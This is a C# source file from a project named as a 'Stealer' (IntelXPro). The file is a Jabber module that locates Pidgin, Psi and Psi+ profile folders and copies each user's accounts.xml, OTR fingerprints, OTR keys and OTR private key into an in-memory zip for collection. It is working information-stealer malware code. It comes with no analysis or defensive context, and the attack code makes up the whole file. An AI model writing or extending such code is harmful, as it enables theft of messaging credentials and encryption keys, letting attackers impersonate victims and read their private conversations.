using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Messengers
{
    internal class Jabber : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string[] source = new string[3]
            {
            folderPath + "\\.purple\\",
            folderPath + "\\Psi\\profiles\\default\\",
            folderPath + "\\Psi+\\profiles\\default\\"
            };
            string[] files2 = new string[4] { "accounts.xml", "otr.fingerprints", "otr.keys", "otr.private_key" };
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Jabber";
            Parallel.ForEach(source, delegate (string dir)
            {
                if (Directory.Exists(dir))
                {
                    Parallel.ForEach(files2, delegate (string file2)
                    {
                        if (File.Exists(dir + file2))
                        {
                            string text = "Jabber\\" + file2;
                            zip.AddFile(text, File.ReadAllBytes(dir + file2));
                            counterApplications.Files.Add(dir + file2 + " => " + text);
                        }
                    });
                }
            });
            if (counterApplications.Files.Count > 0)
            {
                counterApplications.Files.Add("Jabber\\");
                counter.Messangers.Add(counterApplications);
            }
        }
    }
}
